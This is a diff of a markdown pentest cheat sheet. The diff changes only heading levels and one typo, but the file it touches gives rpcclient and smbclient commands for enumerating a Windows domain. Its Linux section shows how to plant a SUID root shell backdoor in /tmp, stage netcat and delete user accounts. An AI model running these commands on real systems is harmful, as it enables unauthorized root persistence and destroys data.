@@ -28,27 +28,27 @@ ___
 #### enumerate shares, but you need a username
 `smbclient -L 172.30.0.22 -U <username>`
 
-### enumerate target Windows system with rpcclient
+#### enumerate target Windows system with rpcclient
 `rpcclient 172.30.0.22 -U <username>`
 
-### rpcclient prompt once logged in
+#### rpcclient prompt once logged in
 `rpcclient $>`
 
 > All commands after this line will be from the `rpcclient $>` prompt, if you don't see that prompt don't progress
 
-### rpcclient help, type at rpcclient prompt, you will hit tab twice
+#### rpcclient help, type at rpcclient prompt, you will hit tab twice
 `enum<tabtab>`
 
-### enumerating users on domain
+#### enumerating users on domain
 `enumdomusers`
 
-### help also prints off a bunch of commands you can use
+#### help also prints off a bunch of commands you can use
 `help`
 
-### enumerate service info
+#### enumerate service info
 `srvinfo`
 
-### enumerate information about password policies
+#### enumerate information about password policies
 `getdompwinfo`
 
 #### enumerate information about user password policies
@@ -59,39 +59,39 @@ ___
 
 ## Linux Goodies! 
 
-### create a copy of /bin/sh shell to the tmp directory and call it backdoor
+#### create a copy of /bin/sh shell to the tmp directory and call it backdoor
 
 `cp /bin/sh /tmp/backdoor`
 
-### want this file to execute as root so chmod it
+#### want this file to execute as root so chmod it
 
 `chmod 4111 /tmp/backdoor`
 
-### file should be red and look at the permissions they will have the SUID bit set
+#### file should be red and look at the permissions they will have the SUID bit set
 
 `ls -l backdoor`
 
-### /bin/sh binary attempts to stop people from gaining root access from a SETUID binary; override this setting by adding a -p option
+#### /bin/sh binary attempts to stop people from gaining root access from a SETUID binary; override this setting by adding a -p option
 
 `./backdoor -p`
 
-### find look for SUID root files on the system in the tmp directory by running this
+#### find look for SUID root files on the system in the tmp directory by running this
 
 `find /tmp -uid 0 -perm -4000 -print`
 
-### find other SUID root files on the system 
+#### find other SUID root files on the system 
 
 `find /bin -uid 0 -perm -4000 -print`
 
-### create a newwork listening process and unlink the executable associated with it
+#### create a network listening process and unlink the executable associated with it
 
 `cp /bin/nc /tmp/nc`
 
-### delete a user account
+#### delete a user account
 
 `userdel -rf <UserAccountName>`
 
-### check to see if you deleted said account (UID 0 because if we are adding accounts they are root, baby ;) )
+#### check to see if you deleted said account (UID 0 because if we are adding accounts they are root, baby ;) )
 
 `grep :0: /etc/passwd`
 
